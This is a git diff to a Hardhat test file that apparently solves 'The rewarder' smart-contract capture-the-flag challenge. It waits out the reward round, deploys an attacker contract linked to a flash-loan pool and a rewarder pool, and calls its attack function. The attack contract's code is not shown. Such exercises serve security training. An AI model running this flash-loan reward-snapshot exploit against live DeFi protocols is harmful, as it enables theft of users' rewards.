@@ -66,6 +66,17 @@ describe("[Challenge] The rewarder", function () {
 
     it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
+        // make the `REWARDS_ROUND_MIN_DURATION` pass, since first snapshot is at deployment
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+
+        const AttackerRewarderFactory = await ethers.getContractFactory("AttackerRewarder", player);
+        const attackerRewarder = await AttackerRewarderFactory.deploy(
+            flashLoanPool.address,
+            rewarderPool.address,
+            liquidityToken.address,
+            rewardToken.address
+        );
+        await attackerRewarder.attack();
     });
 
     after(async function () {
